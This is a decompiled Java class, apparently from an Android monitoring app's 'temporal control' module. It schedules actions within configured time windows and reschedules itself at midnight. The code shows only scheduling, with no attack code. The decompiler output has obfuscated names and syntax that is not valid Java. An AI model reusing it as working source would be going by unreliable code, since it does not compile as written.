package com.vvt.temporalcontrol.b;

import com.vvt.preference.PrefTemporalControl.TemporalControlInfo;
import com.vvt.temporalcontrol.f;
import java.util.ArrayList;
import java.util.GregorianCalendar;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class a
  implements com.vvt.temporalcontrol.a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.c;
  private static final boolean c = com.vvt.ak.a.b;
  private static final boolean d = com.vvt.ak.a.d;
  private static final boolean e = com.vvt.ak.a.e;
  private ScheduledExecutorService f;
  private ScheduledExecutorService g;
  private ArrayList h;
  private com.vvt.temporalcontrol.c i;
  private boolean j;
  
  private void a(int paramInt, long paramLong1, long paramLong2, PrefTemporalControl.TemporalControlInfo paramTemporalControlInfo)
  {
    boolean bool = a;
    if (bool) {}
    ScheduledExecutorService localScheduledExecutorService = this.g;
    b localb = new com/vvt/temporalcontrol/b/b;
    localb.<init>(this, paramInt, paramLong2);
    TimeUnit localTimeUnit = TimeUnit.MILLISECONDS;
    localScheduledExecutorService.schedule(localb, paramLong1, localTimeUnit);
  }
  
  public void a()
  {
    int k = 0;
    a locala = null;
    boolean bool1 = a;
    if (bool1) {}
    bool1 = this.j;
    Object localObject2;
    if (!bool1)
    {
      bool1 = true;
      this.j = bool1;
      localObject2 = "";
    }
    for (;;)
    {
      synchronized (this.h)
      {
        localObject2 = this.h;
        int n = ((ArrayList)localObject2).size();
        localObject2 = Executors.newScheduledThreadPool(n);
        this.g = ((ScheduledExecutorService)localObject2);
        bool1 = a;
        if (bool1) {}
        int i1 = 0;
        if (i1 < n)
        {
          localObject2 = this.h;
          Object localObject3 = ((ArrayList)localObject2).get(i1);
          localObject3 = (PrefTemporalControl.TemporalControlInfo)localObject3;
          localObject2 = ((PrefTemporalControl.TemporalControlInfo)localObject3).getTimeBegin();
          int m = f.a((String)localObject2);
          GregorianCalendar localGregorianCalendar = f.a(m);
          long l1 = localGregorianCalendar.getTimeInMillis();
          String str = ((PrefTemporalControl.TemporalControlInfo)localObject3).getTimeEnd();
          boolean bool2 = com.vvt.ag.b.a(str);
          if (!bool2)
          {
            i2 = f.a(str);
            long l2 = System.currentTimeMillis();
            l2 = f.a(m, i2, l2);
            long l3 = 0L;
            k = l2 < l3;
            if (k > 0)
            {
              m = ((PrefTemporalControl.TemporalControlInfo)localObject3).getAction();
              long l4 = System.currentTimeMillis();
              l1 -= l4;
              k = b;
              if (k != 0) {}
              locala = this;
              a(m, l1, l2, (PrefTemporalControl.TemporalControlInfo)localObject3);
            }
            i1 += 1;
            k = i2;
          }
        }
        else
        {
          k = a;
          if (k != 0) {}
          return;
        }
      }
      int i2 = k;
    }
  }
  
  public void a(com.vvt.temporalcontrol.c paramc)
  {
    this.i = paramc;
  }
  
  public void a(ArrayList paramArrayList)
  {
    this.h = paramArrayList;
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    bool = this.j;
    if (bool)
    {
      bool = false;
      this.j = false;
      ScheduledExecutorService localScheduledExecutorService = this.g;
      if (localScheduledExecutorService != null)
      {
        this.g.shutdown();
        localScheduledExecutorService = this.g;
        localScheduledExecutorService.shutdownNow();
      }
    }
    bool = a;
    if (bool) {}
  }
  
  public void c()
  {
    int k = 1;
    TimeUnit localTimeUnit = null;
    boolean bool1 = a;
    if (bool1) {}
    Object localObject = Executors.newScheduledThreadPool(k);
    this.f = ((ScheduledExecutorService)localObject);
    localObject = new java/util/GregorianCalendar;
    ((GregorianCalendar)localObject).<init>();
    long l1 = ((GregorianCalendar)localObject).getTimeInMillis();
    boolean bool2 = a;
    if (bool2) {}
    ((GregorianCalendar)localObject).add(5, k);
    ((GregorianCalendar)localObject).set(11, 0);
    ((GregorianCalendar)localObject).set(12, 0);
    ((GregorianCalendar)localObject).set(13, 0);
    int m = 14;
    ((GregorianCalendar)localObject).set(m, 0);
    long l2 = ((GregorianCalendar)localObject).getTimeInMillis();
    long l3 = l2 - l1;
    boolean bool3 = a;
    if (bool3) {}
    ScheduledExecutorService localScheduledExecutorService = this.f;
    c localc = new com/vvt/temporalcontrol/b/c;
    localc.<init>(this);
    localTimeUnit = TimeUnit.MILLISECONDS;
    localScheduledExecutorService.schedule(localc, l3, localTimeUnit);
    bool1 = a;
    if (bool1) {}
  }
  
  public void d()
  {
    boolean bool = a;
    if (bool) {}
    ScheduledExecutorService localScheduledExecutorService = this.f;
    if (localScheduledExecutorService != null)
    {
      this.f.shutdown();
      localScheduledExecutorService = this.f;
      localScheduledExecutorService.shutdownNow();
    }
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/temporalcontrol/removeFromPath/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */